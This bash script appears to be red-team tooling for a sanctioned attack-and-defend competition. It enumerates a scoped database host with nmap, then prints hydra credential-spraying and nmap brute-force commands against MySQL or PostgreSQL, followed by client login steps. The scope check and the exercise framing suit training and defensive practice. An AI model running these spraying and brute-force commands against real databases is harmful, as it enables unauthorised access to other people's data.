#!/usr/bin/env bash
# ============================================================
# 05_db_chomper.sh — target: chomper.misty.view (.53)
# CentOS 10. Scored service: Database (MySQL or Postgres — confirm
# with the nmap output from 01_recon_scan.sh before running this).
# ============================================================
# Usage:
#   TARGET_TEAM=07 ./05_db_chomper.sh
#
# Requires: nmap (NSE scripts), hydra, mysql-client / psql (optional,
# only needed once you have credentials to actually connect)
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./scope.env

TARGET="$HOST_CHOMPER"
assert_in_scope "$TARGET"
OUT="$OUTDIR/db_chomper"
mkdir -p "$OUT"

echo "=== DB enumeration: $TARGET ==="
echo "[*] Confirming which DB engine/port is actually open (don't assume)..."
nmap -Pn -sV -p 3306,5432,1433,1521 "$TARGET" -oN "$OUT/db_portscan.txt"
cat "$OUT/db_portscan.txt"

printf "%s\n" "${USERS_CHOMPER[@]}" > "$OUT/userlist.txt"

echo
echo "[*] Branch depending on what's actually open:"

cat <<'EOF'

--- If MySQL (3306) ---
  NSE enum (anonymous/info leak check):
    nmap -Pn --script mysql-info,mysql-enum,mysql-empty-password -p3306 TARGET

  Credential spray (small wordlist, e.g. comp default creds):
    hydra -L OUT/userlist.txt -P ./wordlists/comp_default_creds.txt \
          mysql://TARGET -t 4

  Once you have creds:
    mysql -h TARGET -u USERNAME -p

--- If PostgreSQL (5432) ---
  NSE enum:
    nmap -Pn --script pgsql-brute -p5432 TARGET   # (brute, use sparingly)

  Credential spray:
    hydra -L OUT/userlist.txt -P ./wordlists/comp_default_creds.txt \
          postgres://TARGET -t 4

  Once you have creds:
    psql -h TARGET -U USERNAME -d postgres

EOF

echo "[*] Remember the packet's scoring note: this box should keep the DB"
echo "    locked down to authorized access only — if you get in easily,"
echo "    that's exactly the kind of misconfig this exercise is testing"
echo "    for, on both the attack and defense side."
echo
echo "=== Done. Review $OUT/ ==="
